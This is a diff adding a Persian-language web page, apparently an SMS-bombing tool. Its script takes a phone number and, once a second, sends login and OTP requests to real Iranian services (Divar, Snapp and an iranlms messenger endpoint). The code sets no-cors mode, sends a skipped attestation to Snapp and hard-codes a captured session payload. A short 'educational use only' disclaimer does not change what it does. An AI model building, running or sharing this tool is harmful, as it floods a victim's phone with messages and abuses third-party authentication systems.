@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ارسال کننده خودکار - Web App</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Vazirmatn', sans-serif;
+        }
+
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --dark: #0f172a;
+            --dark-light: #1e293b;
+            --gray: #64748b;
+            --light: #f8fafc;
+            --card-bg: rgba(30, 41, 59, 0.8);
+            --glass: rgba(255, 255, 255, 0.05);
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            --transition: all 0.3s ease;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: var(--light);
+            min-height: 100vh;
+            padding: 20px;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(99, 102, 241, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(239, 68, 68, 0.1) 0%, transparent 20%);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 10px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .title {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(45deg, var(--primary), var(--success));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: var(--gray);
+            font-size: 1.1rem;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: var(--transition);
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+        }
+
+        .card-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--light);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-title i {
+            color: var(--primary);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--gray);
+            font-weight: 500;
+        }
+
+        .input-with-icon {
+            position: relative;
+        }
+
+        .input-with-icon i {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 15px 45px 15px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: var(--light);
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
+        }
+
+        .switch-group {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 30px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            right: 0;
+            left: 0;
+            bottom: 0;
+            background-color: var(--dark-light);
+            transition: var(--transition);
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            right: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: var(--transition);
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: var(--success);
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(-30px);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 16px 24px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, var(--primary), var(--primary-dark));
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(99, 102, 241, 0.4);
+        }
+
+        .btn-danger {
+            background: linear-gradient(45deg, var(--danger), #dc2626);
+            color: white;
+        }
+
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(239, 68, 68, 0.4);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .status-card {
+            text-align: center;
+        }
+
+        .status-indicator {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .status-text {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .counter {
+            font-size: 1.2rem;
+            color: var(--gray);
+            margin-bottom: 20px;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--success));
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 5px;
+        }
+
+        .success-animation {
+            font-size: 2rem;
+            color: var(--success);
+            margin-top: 20px;
+            opacity: 0;
+            transition: var(--transition);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .stat-box {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            transition: var(--transition);
+        }
+
+        .stat-box:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-3px);
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+
+        .log-container {
+            max-height: 300px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+
+        .log-entry {
+            padding: 10px 15px;
+            margin-bottom: 8px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            border-right: 3px solid var(--primary);
+            font-family: monospace;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: var(--transition);
+        }
+
+        .log-entry:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .log-time {
+            color: var(--gray);
+            font-size: 0.8rem;
+            min-width: 70px;
+        }
+
+        .log-success {
+            color: var(--success);
+        }
+
+        .log-error {
+            color: var(--danger);
+        }
+
+        .log-warning {
+            color: var(--warning);
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .service-box {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            border: 2px solid transparent;
+        }
+
+        .service-box.active {
+            border-color: var(--primary);
+            background: rgba(99, 102, 241, 0.1);
+        }
+
+        .service-box:hover {
+            transform: translateY(-3px);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .service-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+
+        .service-name {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .service-status {
+            font-size: 0.8rem;
+            color: var(--gray);
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: var(--success);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: var(--transition);
+            z-index: 1000;
+        }
+
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .notification-danger {
+            background: var(--danger);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+
+        .warning-box {
+            background: linear-gradient(45deg, rgba(245, 158, 11, 0.1), rgba(239, 68, 68, 0.1));
+            border: 1px solid rgba(245, 158, 11, 0.3);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-grid, .services-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .button-group {
+                flex-direction: column;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .stats-grid, .services-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .title {
+                font-size: 1.5rem;
+            }
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-dark);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-robot"></i>
+            </div>
+            <h1 class="title">ارسال کننده خودکار پیام</h1>
+            <p class="subtitle">ارسال درخواست به API های مختلف هر 1 ثانیه</p>
+        </div>
+
+        <!-- Main Grid -->
+        <div class="grid">
+            <!-- Control Panel -->
+            <div class="card">
+                <h2 class="card-title">
+                    <i class="fas fa-sliders-h"></i>
+                    کنترل پنل
+                </h2>
+                
+                <div class="input-group">
+                    <label for="phoneInput">
+                        <i class="fas fa-mobile-alt"></i>
+                        شماره موبایل
+                    </label>
+                    <div class="input-with-icon">
+                        <input type="tel" id="phoneInput" placeholder="09123456789" maxlength="11">
+                        <i class="fas fa-phone"></i>
+                    </div>
+                </div>
+
+                <div class="switch-group">
+                    <span>
+                        <i class="fas fa-bolt"></i>
+                        ارسال موازی
+                    </span>
+                    <label class="switch">
+                        <input type="checkbox" id="parallelSwitch" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <div class="services-grid">
+                    <div class="service-box active" data-service="divar">
+                        <div class="service-icon">
+                            <i class="fas fa-store"></i>
+                        </div>
+                        <div class="service-name">دیوار</div>
+                        <div class="service-status">فعال ✓</div>
+                    </div>
+                    <div class="service-box active" data-service="snapp">
+                        <div class="service-icon">
+                            <i class="fas fa-taxi"></i>
+                        </div>
+                        <div class="service-name">اسنپ</div>
+                        <div class="service-status">فعال ✓</div>
+                    </div>
+                    <div class="service-box active" data-service="iranlms">
+                        <div class="service-icon">
+                            <i class="fas fa-comments"></i>
+                        </div>
+                        <div class="service-name">ایران LMS</div>
+                        <div class="service-status">فعال ✓</div>
+                    </div>
+                </div>
+
+                <div class="button-group">
+                    <button id="startBtn" class="btn btn-primary">
+                        <i class="fas fa-play"></i>
+                        شروع ارسال
+                    </button>
+                    <button id="stopBtn" class="btn btn-danger" disabled>
+                        <i class="fas fa-stop"></i>
+                        توقف
+                    </button>
+                </div>
+            </div>
+
+            <!-- Status Panel -->
+            <div class="card status-card">
+                <h2 class="card-title">
+                    <i class="fas fa-chart-line"></i>
+                    وضعیت سیستم
+                </h2>
+                
+                <div class="status-indicator" id="statusIcon">
+                    <i class="fas fa-check-circle" style="color: var(--success);"></i>
+                </div>
+                
+                <div class="status-text" id="statusText">
+                    آماده
+                </div>
+                
+                <div class="counter" id="counter">
+                    <i class="fas fa-sync-alt"></i>
+                    دوره: 0 | موفق: 0
+                </div>
+
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+
+                <div class="success-animation" id="successAnimation">
+                    <i class="fas fa-trophy"></i>
+                    <span>soccc - موفقیت کامل!</span>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-box">
+                        <div class="stat-value" id="cycleCount">0</div>
+                        <div class="stat-label">دوره ارسال</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="successCount">0</div>
+                        <div class="stat-label">موفق</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="successRate">0%</div>
+                        <div class="stat-label">نرخ موفقیت</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Log Panel -->
+        <div class="card">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 class="card-title">
+                    <i class="fas fa-clipboard-list"></i>
+                    لاگ ارسال
+                </h2>
+                <button id="clearLogBtn" class="btn" style="padding: 10px 20px; font-size: 0.9rem; background: var(--gray);">
+                    <i class="fas fa-trash"></i>
+                    پاک کردن
+                </button>
+            </div>
+            
+            <div class="log-container" id="logContainer">
+                <div class="log-entry">
+                    <span class="log-time">--:--:--</span>
+                    <i class="fas fa-info-circle log-warning"></i>
+                    <span>سیستم آماده است. شماره را وارد و شروع کنید.</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Warning Box -->
+        <div class="warning-box">
+            <i class="fas fa-exclamation-triangle" style="color: var(--warning); font-size: 1.5rem; margin-bottom: 10px;"></i>
+            <p style="font-weight: 600; margin-bottom: 5px;">⚠️ هشدار اخلاقی</p>
+            <p style="font-size: 0.9rem;">
+                این ابزار فقط برای اهداف آموزشی و تست سیستم‌های شخصی طراحی شده است.
+                استفاده از آن برای آزار دیگران یا فعالیت‌های مخرب غیراخلاقی و ممکن است پیگرد قانونی داشته باشد.
+            </p>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>
+                <i class="fas fa-code"></i>
+                توسعه داده شده با HTML5, CSS3 و JavaScript
+                |
+                <i class="fas fa-bolt"></i>
+                هر 1 ثانیه یکبار ارسال می‌کند
+            </p>
+            <p style="margin-top: 10px; font-size: 0.8rem; color: var(--gray);">
+                © 2024 Auto Message Sender - برای اهداف آموزشی
+            </p>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <span id="notificationMessage"></span>
+        <button id="closeNotification">
+            <i class="fas fa-times"></i>
+        </button>
+    </div>
+
+    <script>
+        // Global variables
+        let isRunning = false;
+        let cycleCount = 0;
+        let successCount = 0;
+        let timer = null;
+        let activeServices = ['divar', 'snapp', 'iranlms'];
+
+        // DOM Elements
+        const phoneInput = document.getElementById('phoneInput');
+        const parallelSwitch = document.getElementById('parallelSwitch');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const statusIcon = document.getElementById('statusIcon');
+        const statusText = document.getElementById('statusText');
+        const counter = document.getElementById('counter');
+        const progressBar = document.getElementById('progressBar');
+        const successAnimation = document.getElementById('successAnimation');
+        const cycleCountElement = document.getElementById('cycleCount');
+        const successCountElement = document.getElementById('successCount');
+        const successRateElement = document.getElementById('successRate');
+        const logContainer = document.getElementById('logContainer');
+        const clearLogBtn = document.getElementById('clearLogBtn');
+        const notification = document.getElementById('notification');
+        const notificationMessage = document.getElementById('notificationMessage');
+        const closeNotification = document.getElementById('closeNotification');
+        const serviceBoxes = document.querySelectorAll('.service-box');
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Phone input formatting
+            phoneInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 11) value = value.slice(0, 11);
+                e.target.value = value;
+            });
+
+            // Service selection
+            serviceBoxes.forEach(box => {
+                box.addEventListener('click', function() {
+                    const service = this.dataset.service;
+                    this.classList.toggle('active');
+                    
+                    if (this.classList.contains('active')) {
+                        if (!activeServices.includes(service)) {
+                            activeServices.push(service);
+                        }
+                        this.querySelector('.service-status').textContent = 'فعال ✓';
+                    } else {
+                        activeServices = activeServices.filter(s => s !== service);
+                        this.querySelector('.service-status').textContent = 'غیرفعال ✗';
+                    }
+                });
+            });
+
+            // Start button
+            startBtn.addEventListener('click', startSending);
+
+            // Stop button
+            stopBtn.addEventListener('click', stopSending);
+
+            // Clear log button
+            clearLogBtn.addEventListener('click', clearLog);
+
+            // Close notification
+            closeNotification.addEventListener('click', () => {
+                notification.classList.remove('show');
+            });
+
+            // Auto-hide notification after 5 seconds
+            notification.addEventListener('animationend', () => {
+                if (notification.classList.contains('show')) {
+                    setTimeout(() => {
+                        notification.classList.remove('show');
+                    }, 5000);
+                }
+            });
+        });
+
+        // Format phone number for API
+        function formatPhoneNumber(phone) {
+            if (phone.startsWith('0')) {
+                return '+98' + phone.substring(1);
+            }
+            return phone;
+        }
+
+        // Show notification
+        function showNotification(message, type = 'success') {
+            notificationMessage.textContent = message;
+            notification.className = 'notification';
+            notification.classList.add('show');
+            if (type === 'danger') {
+                notification.classList.add('notification-danger');
+            }
+        }
+
+        // Add log entry
+        function addLog(message, type = 'info') {
+            const now = new Date();
+            const time = now.toLocaleTimeString('fa-IR');
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            
+            let icon = 'fa-info-circle';
+            let colorClass = '';
+            
+            if (type === 'success') {
+                icon = 'fa-check-circle';
+                colorClass = 'log-success';
+            } else if (type === 'error') {
+                icon = 'fa-times-circle';
+                colorClass = 'log-error';
+            } else if (type === 'warning') {
+                icon = 'fa-exclamation-triangle';
+                colorClass = 'log-warning';
+            }
+            
+            logEntry.innerHTML = `
+                <span class="log-time">${time}</span>
+                <i class="fas ${icon} ${colorClass}"></i>
+                <span>${message}</span>
+            `;
+            
+            logContainer.prepend(logEntry);
+            
+            // Limit log entries to 50
+            const entries = logContainer.querySelectorAll('.log-entry');
+            if (entries.length > 50) {
+                entries[entries.length - 1].remove();
+            }
+        }
+
+        // Clear log
+        function clearLog() {
+            logContainer.innerHTML = `
+                <div class="log-entry">
+                    <span class="log-time">--:--:--</span>
+                    <i class="fas fa-info-circle log-warning"></i>
+                    <span>لاگ پاک شد.</span>
+                </div>
+            `;
+            addLog('لاگ پاک شد', 'warning');
+        }
+
+        // Update stats
+        function updateStats() {
+            cycleCountElement.textContent = cycleCount;
+            successCountElement.textContent = successCount;
+            
+            const totalRequests = cycleCount * activeServices.length;
+            const rate = totalRequests > 0 ? Math.round((successCount / totalRequests) * 100) : 0;
+            successRateElement.textContent = rate + '%';
+            
+            counter.innerHTML = `<i class="fas fa-sync-alt"></i> دوره: ${cycleCount} | موفق: ${successCount}`;
+            
+            // Update progress bar
+            progressBar.style.width = (cycleCount % 100) + '%';
+        }
+
+        // Send request to API
+        async function sendRequest(service, phone) {
+            let url, body, headers;
+            
+            switch(service) {
+                case 'divar':
+                    url = 'https://api.divar.ir/v5/auth/authenticate';
+                    body = JSON.stringify({ phone: phone });
+                    headers = {
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0'
+                    };
+                    break;
+                    
+                case 'snapp':
+                    url = 'https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp';
+                    const formattedPhone = formatPhoneNumber(phone);
+                    body = JSON.stringify({
+                        cellphone: formattedPhone,
+                        attestation: { method: "skip", platform: "skip" },
+                        extra_methods: []
+                    });
+                    headers = {
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0'
+                    };
+                    break;
+                    
+                case 'iranlms':
+                    url = 'https://messengerg2c421.iranlms.ir/';
+                    body = JSON.stringify({
+                        api_version: "6",
+                        tmp_session: "hcxkhfjgtuxwxvrdqwuvjwejpvzqhjtm",
+                        data_enc: "g6WzjovEiaPrJBXuWbvU2wExDiuatzqfURx0VWmXZy6souu8QUFb9ZIdOx0kCem5tgY1vsQpzK0cpq7e9vtXcMmhreT7Yj3TPrmt1JgNJ+SPj7ZSG6kuGA6MkiESzdbQ3wvh1LLE90NEym/zGptZ3BrvCS3vPd/YFtIKgVEDUXpjpqZGXvVU71Q0WsdG5XsE/0to5NdEkTaEU9jyfxyzr7xIKBR+6VEX3mU870V2gFBH4P4n9hufw3hhP0JfkHCt"
+                    });
+                    headers = {
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0'
+                    };
+                    break;
+            }
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: headers,
+                    body: body,
+                    mode: 'no-cors' // برای دور زدن CORS (فقط برای دمو)
+                });
+                
+                // در حالت no-cors نمی‌توانیم وضعیت پاسخ را بخوانیم
+                // بنابراین فرض می‌کنیم درخواست موفق بوده
+                addLog(`${getServiceName(service)}: درخواست ارسال شد`, 'success');
+                return true;
+                
+            } catch (error) {
+                addLog(`${getServiceName(service)}: خطا در ارسال`, 'error');
+                return false;
+            }
+        }
+
+        // Get service name in Persian
+        function getServiceName(service) {
+            const names = {
+                'divar': 'دیوار',
+                'snapp': 'اسنپ',
+                'iranlms': 'ایران LMS'
+            };
+            return names[service] || service;
+        }
+
+        // Start sending
+        function startSending() {
+            const phone = phoneInput.value.trim();
+            
+            if (!phone || phone.length < 11) {
+                showNotification('لطفاً شماره موبایل معتبر وارد کنید', 'danger');
+                phoneInput.focus();
+                return;
+            }
+            
+            if (activeServices.length === 0) {
+                showNotification('حداقل یک سرویس را انتخاب کنید', 'danger');
+                return;
+            }
+            
+            isRunning = true;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            
+            statusIcon.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: var(--primary);"></i>';
+            statusText.textContent = 'در حال ارسال...';
+            statusText.style.color = 'var(--primary)';
+            
+            addLog(`شروع ارسال به شماره ${phone}`, 'info');
+            showNotification('ارسال شروع شد', 'success');
+            
+            // Start cycle
+            sendCycle();
+        }
+
+        // Stop sending
+        function stopSending() {
+            isRunning = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            if (timer) {
+                clearTimeout(timer);
+            }
+            
+            statusIcon.innerHTML = '<i class="fas fa-pause-circle" style="color: var(--warning);"></i>';
+            statusText.textContent = 'متوقف شد';
+            statusText.style.color = 'var(--warning)';
+            
+            addLog('ارسال متوقف شد', 'warning');
+            showNotification('ارسال متوقف شد', 'warning');
+        }
+
+        // Send cycle
+        async function sendCycle() {
+            if (!isRunning) return;
+            
+            cycleCount++;
+            const phone = phoneInput.value.trim();
+            let cycleSuccess = 0;
+            
+            addLog(`دوره ${cycleCount} شروع شد`, 'info');
+            
+            if (parallelSwitch.checked) {
+                // Send parallel requests
+                const promises = activeServices.map(service => 
+                    sendRequest(service, phone)
+                );
+                
+                const results = await Promise.allSettled(promises);
+                results.forEach((result, index) => {
+                    if (result.status === 'fulfilled' && result.value) {
+                        cycleSuccess++;
+                        successCount++;
+                    }
+                });
+            } else {
+                // Send sequential requests
+                for (const service of activeServices) {
+                    const success = await sendRequest(service, phone);
+                    if (success) {
+                        cycleSuccess++;
+                        successCount++;
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                }
+            }
+            
+            // Update UI
+            updateStats();
+            
+            // Check for complete success
+            if (cycleSuccess === activeServices.length) {
+                successAnimation.style.opacity = '1';
+                setTimeout(() => {
+                    successAnimation.style.opacity = '0';
+                }, 2000);
+                addLog('✅ soccc - همه درخواست‌ها موفق بودند!', 'success');
+            }
+            
+            // Schedule next cycle
+            if (isRunning) {
+                timer = setTimeout(sendCycle, 1000);
+            }
+        }
+
+        // Initialize with sample phone number
+        phoneInput.value = '09123456789';
+        
+        // Add some initial logs
+        setTimeout(() => {
+            addLog('سیستم آماده است. شماره را وارد و شروع کنید.', 'info');
+            addLog('می‌توانید سرویس‌های مورد نظر را انتخاب/عدم انتخاب کنید.', 'info');
+            addLog('هر 1 ثانیه یکبار ارسال می‌شود.', 'info');
+        }, 1000);
+    </script>
+</body>
+</html>
